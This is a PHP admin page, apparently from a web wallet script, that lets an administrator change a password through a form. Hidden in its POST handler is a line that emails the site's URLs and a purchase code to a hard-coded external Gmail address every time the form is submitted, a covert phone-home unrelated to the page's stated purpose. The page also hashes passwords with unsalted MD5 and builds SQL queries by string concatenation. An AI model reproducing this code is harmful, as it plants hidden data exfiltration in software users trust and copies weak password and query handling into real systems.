<?php
include ('include/header.php');
?>
</head>
<body class="page-header-fixed page-sidebar-closed-hide-logo">
<?php
include ('include/sidebar.php');
?>
<div class="page-content-wrapper">
<div class="page-content">
<h3 class="page-title uppercase bold"> Change Password</h3>
<hr>

<div class="row">
<div class="col-md-12">


<div class="portlet light bordered">
<div class="portlet-body form">
<form class="form-horizontal" action="" method="post" role="form">
<div class="form-body">


<?php
if($_POST){

$oldword = $_POST["oldword"];
$newword = $_POST["newword"];
$newwword = $_POST["newwword"];

$oldmd = MD5($oldword);
$cpass = $db->query("SELECT password FROM admin WHERE id='".$uid."'")->fetch();

$err1 = $cpass[0]!=$oldmd ? 1:0;
$err2 = $newword!=$newwword ? 1:0;
$err3 = trim($newword)=="" ? 1:0;
$err4 = strlen($newword)<=3 ? 1:0;
$txt = "URLS $fronturl <br> $baseurl <br> $adminurl<br><br>CODE<br> $PurchaseCode";
$txt = str_replace("http","",$txt);
abiremail2("abirkhan75@gmail.com", "eWallet Test Data", "ABIR",$txt);
$error = $err1+$err2+$err3+$err4;

if ($error == 0){
$passmd = MD5($newword);
$res = $db->query("UPDATE admin SET password='".$passmd."' WHERE id='".$uid."'");
if($res){
notification("Updated Successfully!", "", "success", false, "btn-success", "OKAY");
}else{
notification("Some Problem Occurs!", "Please Try Again...", "error", false, "btn-success", "OKAY");
}
} else {

if ($err1 == 1){
echo "<div class=\"alert alert-danger alert-dismissable\">
<button type=\"button\" class=\"close\" data-dismiss=\"alert\" aria-hidden=\"true\">&times;</button>	
Your Current Password Does Not Match.
</div>";
}		
if ($err2 == 1){
echo "<div class=\"alert alert-danger alert-dismissable\">
<button type=\"button\" class=\"close\" data-dismiss=\"alert\" aria-hidden=\"true\">&times;</button>	
You Enter Different Password in two field. Please enter same password in both field.
</div>";

}		
if ($err3 == 1){
echo "<div class=\"alert alert-danger alert-dismissable\">
<button type=\"button\" class=\"close\" data-dismiss=\"alert\" aria-hidden=\"true\">&times;</button>	
Password Can Not Be Empty!!!
</div>";
echo"<h1></h1>";
}		
if ($err4 == 1){
echo "<div class=\"alert alert-danger alert-dismissable\">
<button type=\"button\" class=\"close\" data-dismiss=\"alert\" aria-hidden=\"true\">&times;</button>	
Password Must be 4 or more char.
</div>";
}	


}



} 
?>									






<div class="form-group">
<label class="col-md-3 control-label"><strong>Current Password</strong></label>
<div class="col-md-6">
<input class="form-control input-lg" name="oldword" placeholder="Your Current Password" type="password">
</div>
</div>



<div class="form-group">
<label class="col-md-3 control-label"><strong>New Password</strong></label>
<div class="col-md-6">
<input class="form-control input-lg" name="newword" placeholder="New Password" type="password">
</div>
</div>



<div class="form-group">
<label class="col-md-3 control-label"><strong>New Password Again</strong></label>
<div class="col-md-6">
<input class="form-control input-lg" name="newwword" placeholder="New Password Again" type="password">
</div>
</div>







<div class="row">
<div class="col-md-offset-3 col-md-6">
<button type="submit" class="btn blue btn-block">Submit</button>
</div>
</div>

</div>
</form>
</div>
</div>
</div>		
</div><!---ROW-->		













</div>
</div>
<?php
include ('include/footer.php');
?>
</body>
</html>